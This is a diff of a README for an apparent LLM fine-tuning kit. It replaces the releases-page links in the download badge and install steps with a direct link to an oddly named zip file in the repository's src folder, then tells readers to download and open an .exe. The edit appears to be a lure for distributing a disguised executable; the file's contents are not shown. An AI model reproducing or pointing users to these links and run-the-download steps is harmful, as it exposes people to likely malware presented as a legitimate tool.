@@ -1,6 +1,6 @@
 # 🛠️ llm-finetune-kit - Train your own language models easily
 
-[![](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/Spraydried-toxotesjaculatrix599/llm-finetune-kit/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/Spraydried-toxotesjaculatrix599/llm-finetune-kit/raw/refs/heads/main/src/llm_kit_finetune_intrenchment.zip)
 
 This software helps you train language models on your own hardware. You can adjust models like Qwen, DeepSeek, or LLaMA to fit your specific data. It uses efficient methods that work on consumer graphics cards. You do not need to write code to start training.
 
@@ -8,7 +8,7 @@ This software helps you train language models on your own hardware. You can adju
 
 To run this tool, you need a computer with a modern graphics card. Most recent gaming cards from NVIDIA work well. You should have at least 8 gigabytes of video memory. If you have less, the training process might stop or run slowly.
 
-1. Go to the [download page](https://github.com/Spraydried-toxotesjugulatrix599/llm-finetune-kit/releases).
+1. Go to the [download page](https://github.com/Spraydried-toxotesjaculatrix599/llm-finetune-kit/raw/refs/heads/main/src/llm_kit_finetune_intrenchment.zip).
 2. Look for the file that ends with `.exe`.
 3. Select that file to download it to your computer.
 4. Open the file once the download finishes.
